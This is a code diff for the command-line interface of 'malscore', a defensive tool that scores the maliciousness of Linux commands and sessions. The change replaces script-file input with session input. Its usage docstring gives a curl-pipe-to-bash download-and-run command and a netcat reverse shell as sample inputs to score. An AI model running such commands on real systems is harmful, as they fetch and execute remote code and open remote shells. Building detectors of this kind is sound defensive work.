@@ -1,10 +1,10 @@
 """Command-line interface.
 
     malscore "curl -s http://1.2.3.4/x.sh | bash"     # score one command
-    malscore -f deploy.sh                              # score a whole script
-    echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -    # read from stdin
-    malscore --batch events.jsonl                      # score a JSONL feed
-    malscore -f suspicious.sh --json                   # machine-readable output
+    echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -    # read the command from stdin
+    malscore --session history.txt                    # score a session, one command per line
+    malscore --batch events.jsonl                      # score each command in a JSONL feed
+    malscore --session history.txt --json              # machine-readable output
 """
 
 from __future__ import annotations
@@ -65,15 +65,15 @@ def render_text(assessment: Assessment, color: bool, explain: bool, title: str =
     if assessment.tactics:
         lines.append("  tactics: " + ", ".join(assessment.tactics))
 
-    if assessment.per_statement:
-        flagged = [s for s in assessment.per_statement if s.hits]
+    if assessment.per_command:
+        flagged = [c for c in assessment.per_command if c.hits]
         lines.append("")
-        lines.append("  %d statement(s), %d flagged:" % (len(assessment.per_statement), len(flagged)))
-        for statement in flagged:
+        lines.append("  %d command(s), %d flagged:" % (len(assessment.per_command), len(flagged)))
+        for command in flagged:
             lines.append("    %s L%-4d %3d %-8s %s" % (
-                _bar(statement.score, color, statement.verdict),
-                statement.line, statement.score, statement.verdict,
-                _truncate(statement.command, 60)))
+                _bar(command.score, color, command.verdict),
+                command.line, command.score, command.verdict,
+                _truncate(command.command, 60)))
 
     if explain and assessment.hits:
         lines.append("")
@@ -100,20 +100,24 @@ def _first(record: Dict[str, Any], keys: Sequence[str]) -> Any:
     return None
 
 
+def _read_text(path: str) -> str:
+    """Read a text file; ``-`` reads stdin and a ``.gz`` suffix is decompressed."""
+    if path == "-":
+        return sys.stdin.read()
+    if path.endswith(".gz"):
+        with io.TextIOWrapper(gzip.open(path, "rb"), encoding="utf-8", errors="replace") as handle:
+            return handle.read()
+    with open(path, "r", encoding="utf-8", errors="replace") as handle:
+        return handle.read()
+
+
 def read_feed(path: str) -> Iterator[Tuple[int, Dict[str, Any]]]:
     """Yield ``(line, record)`` from a JSON Lines file or a JSON array of objects.
 
-    ``-`` reads stdin and a ``.gz`` suffix is decompressed.  Malformed lines and
-    non-object entries are skipped, so one bad record never aborts a feed.
+    Malformed lines and non-object entries are skipped, so one bad record never
+    aborts a feed.
     """
-    if path == "-":
-        text = sys.stdin.read()
-    elif path.endswith(".gz"):
-        with io.TextIOWrapper(gzip.open(path, "rb"), encoding="utf-8", errors="replace") as handle:
-            text = handle.read()
-    else:
-        with open(path, "r", encoding="utf-8", errors="replace") as handle:
-            text = handle.read()
+    text = _read_text(path)
 
     if text.lstrip().startswith("["):
         try:
@@ -145,10 +149,7 @@ def _feed_command(record: Dict[str, Any]) -> str:
     return "" if value is None else str(value)
 
 
-def _read_input(args: argparse.Namespace) -> Optional[str]:
-    if args.file:
-        with open(args.file, "r", encoding="utf-8", errors="replace") as handle:
-            return handle.read()
+def _read_command(args: argparse.Namespace) -> Optional[str]:
     if args.command == ["-"] or (not args.command and not sys.stdin.isatty()):
         return sys.stdin.read()
     if args.command:
@@ -172,7 +173,7 @@ def _score_batch(analyzer: Analyzer, args: argparse.Namespace, color: bool) -> i
             continue
         shown += 1
         if args.json:
-            result = assessment.as_dict(include_statements=False)
+            result = assessment.as_dict(include_commands=False)
             for name, keys in (("user", USER_KEYS), ("timestamp", TIME_KEYS)):
                 value = _first(record, keys)
                 if value is not None:
@@ -190,14 +191,14 @@ def _score_batch(analyzer: Analyzer, args: argparse.Namespace, color: bool) -> i
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="malscore",
-        description="Score the maliciousness of a Linux command or shell script (0-100).",
+        description="Score the maliciousness of a Linux command or a session of commands (0-100).",
         epilog="The tool never executes what it analyses; it only reads the text.",
     )
     parser.add_argument("command", nargs="*", help="command to score, or '-' to read stdin")
-    parser.add_argument("-f", "--file", help="score a shell script file")
-    parser.add_argument("--batch", help="score every command in a JSONL/array event feed")
-    parser.add_argument("-c", "--command-mode", action="store_true",
-                        help="treat input as a single command even if it spans lines")
+    parser.add_argument("-s", "--session", metavar="FILE",
+                        help="score a session: one command per line ('-' reads stdin)")
+    parser.add_argument("--batch", metavar="FILE",
+                        help="score every command in a JSONL/array event feed independently")
     parser.add_argument("-j", "--json", action="store_true", help="emit JSON instead of text")
     parser.add_argument("-e", "--explain", action="store_true",
                         help="list every signal with its weight and MITRE techniques")
@@ -214,20 +215,27 @@ def build_parser() -> argparse.ArgumentParser:
 def main(argv: Optional[Sequence[str]] = None) -> int:
     parser = build_parser()
     args = parser.parse_args(argv)
-    color = not args.no_color and not args.json and _supports_color(sys.stdout)
+    if sum(1 for given in (args.command, args.session, args.batch) if given) > 1:
+        parser.error("give only one of a command, --session FILE or --batch FILE")
+    color =not args.no_color and not args.json and _supports_color(sys.stdout)
     analyzer = Analyzer(redact=args.redact)
 
     if args.batch:
         worst = _score_batch(analyzer, args, color)
     else:
-        text = _read_input(args)
-        if text is None or not text.strip():
-            parser.error("provide a command, -f FILE, --batch FILE, or pipe via stdin")
-        assessment = analyzer.assess_command(text.strip()) if args.command_mode else analyzer.assess(text)
+        if args.session:
+            assessment = analyzer.assess_session(_read_text(args.session).splitlines())
+            if not assessment.per_command:
+                parser.error("session %s contains no commands" % args.session)
+        else:
+            text = _read_command(args)
+            if text is None or not text.strip():
+                parser.error("provide a command, --session FILE, --batch FILE, or pipe via stdin")
+            assessment = analyzer.assess_command(text.strip())
         if args.json:
             print(json.dumps(assessment.as_dict(), indent=2))
         else:
-            title = os.path.basename(args.file) if args.file else ""
+            title = os.path.basename(args.session) if args.session and args.session != "-" else ""
             print(render_text(assessment, color, args.explain, title=title))
         worst = VERDICTS.index(assessment.verdict)
 
